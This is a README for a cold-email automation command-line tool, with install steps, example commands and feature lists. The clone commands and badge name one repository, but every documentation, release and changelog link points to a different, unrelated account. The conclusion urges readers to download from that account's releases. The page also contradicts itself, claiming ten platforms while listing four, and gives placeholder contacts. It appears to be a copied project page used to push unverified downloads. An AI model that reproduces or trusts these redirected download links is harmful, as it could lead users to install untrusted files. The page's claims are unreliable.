# ❄️ Cold Email CLI

**Professional multi-platform cold email automation CLI with 627+ commands across 10 major platforms**

[![CI](https://github.com/LeadMagic/cold-email-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/LeadMagic/cold-email-cli/actions/workflows/ci.yml)  
[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)  
[![Bun](https://img.shields.io/badge/Bun-000000?style=flat&logo=bun&logoColor=white)](https://bun.sh/)  
[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)  

## 📦 Overview

Cold Email CLI is a command-line interface designed for efficient cold email automation. It simplifies outreach for sales and marketing professionals, allowing them to connect with potential leads across various platforms. With over 627 commands, this tool offers flexibility and power for your email campaigns.

### Features

- **Multi-Platform Support**: Works seamlessly with 10 major platforms.
- **Extensive Command Set**: Over 627 commands to customize your outreach.
- **Interactive Menu**: Easy navigation through a user-friendly interface.
- **ASCII Art**: Launch platform-specific shells with engaging visuals.

## 🚀 Quick Start

To get started quickly, follow these steps:

1. **Install Bun (recommended)**:
   ```bash
   curl -fsSL https://bun.sh/install | bash
   ```

2. **Clone the Repository**:
   ```bash
   git clone https://github.com/LeadMagic/cold-email-cli.git
   cd cold-email-cli
   ```

3. **Install Dependencies**:
   ```bash
   bun install
   ```

4. **Launch the Interactive Menu**:
   ```bash
   bun run menu
   ```

5. **Launch Platform-Specific Shells**:
   - For SmartLead:
     ```bash
     bun run smartlead    # 🌊 SmartLead Command Center
     ```
   - For Instantly:
     ```bash
     bun run instantly    # 🚀 Instantly Automation
     ```

## 🌐 Platforms Supported

Cold Email CLI integrates with several platforms to enhance your outreach efforts. Here’s a list of supported platforms:

- **SmartLead**: An intuitive platform for managing leads and campaigns.
- **Instantly**: Automation tools for sending cold emails effectively.
- **SalesForge**: A powerful tool for B2B sales outreach.
- **Apollo**: API client for seamless integration with your existing tools.

## 📚 Documentation

For detailed usage instructions and command references, please check the [Documentation](https://github.com/Rohini4228/cold-email-cli/releases). You can find comprehensive guides and examples for each command and platform.

### Example Commands

Here are a few example commands to help you get started:

- **Send a Cold Email**:
  ```bash
  bun run send-email --to "example@example.com" --subject "Your Subject Here" --body "Your email body here."
  ```

- **List All Leads**:
  ```bash
  bun run list-leads
  ```

- **Import Leads from CSV**:
  ```bash
  bun run import-leads --file "path/to/leads.csv"
  ```

## 📊 Use Cases

Cold Email CLI can be beneficial for various scenarios:

- **B2B Sales**: Reach out to potential clients and partners effectively.
- **Marketing Campaigns**: Automate your email marketing efforts to save time.
- **Lead Generation**: Use the CLI to manage and nurture leads efficiently.

## 🔧 Installation

### Prerequisites

- Ensure you have [Node.js](https://nodejs.org/) installed on your machine.
- Install [Bun](https://bun.sh/) for the best experience.

### Installation Steps

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/LeadMagic/cold-email-cli.git
   ```

2. **Navigate to the Directory**:
   ```bash
   cd cold-email-cli
   ```

3. **Install Dependencies**:
   ```bash
   bun install
   ```

## 🛠️ Commands Overview

Cold Email CLI offers a wide range of commands. Below is a categorized overview:

### Email Commands

- **send-email**: Sends a cold email to a specified recipient.
- **list-emails**: Lists all email templates available.

### Lead Management

- **add-lead**: Adds a new lead to your database.
- **remove-lead**: Removes a lead from your database.
- **update-lead**: Updates lead information.

### Reporting

- **generate-report**: Generates a report on email outreach performance.
- **view-stats**: Displays statistics on sent emails and responses.

## 🎨 Customization

You can customize your email templates and commands to fit your needs. The configuration files are located in the `config` directory. Modify these files to adjust settings such as:

- Email subject lines
- Body templates
- Lead sources

## 🔄 Updating

To keep your Cold Email CLI up to date, regularly check for new releases. Visit the [Releases](https://github.com/Rohini4228/cold-email-cli/releases) section to download the latest version.

## 🛡️ License

This project is licensed under the MIT License. See the [LICENSE](https://choosealicense.com/licenses/mit/) file for details.

## 🤝 Contributing

We welcome contributions from the community. To contribute:

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request.

### Reporting Issues

If you encounter any issues, please report them in the [Issues](https://github.com/Rohini4228/cold-email-cli/issues) section.

## 🌍 Community

Join our community to discuss features, report bugs, and share your experiences. You can connect with us on:

- **GitHub Discussions**: Engage with other users and developers.
- **Twitter**: Follow us for updates and tips.

## 📧 Contact

For any inquiries or support, feel free to reach out via email at support@example.com.

## 🔗 Resources

- [Cold Email Best Practices](https://example.com/best-practices)
- [Email Marketing Strategies](https://example.com/email-marketing)

## 🔄 Changelog

Check the [Releases](https://github.com/Rohini4228/cold-email-cli/releases) section for a detailed changelog of updates and improvements.

## 📈 Future Plans

We plan to expand Cold Email CLI with more features, including:

- Integration with additional platforms.
- Advanced analytics for email performance.
- Enhanced user interface for better navigation.

Stay tuned for updates!

## 📝 Conclusion

Cold Email CLI is a powerful tool for anyone looking to streamline their cold email outreach. With its extensive command set and multi-platform support, it provides the flexibility needed to succeed in today's competitive landscape. Download the latest version from the [Releases](https://github.com/Rohini4228/cold-email-cli/releases) section and start automating your email campaigns today.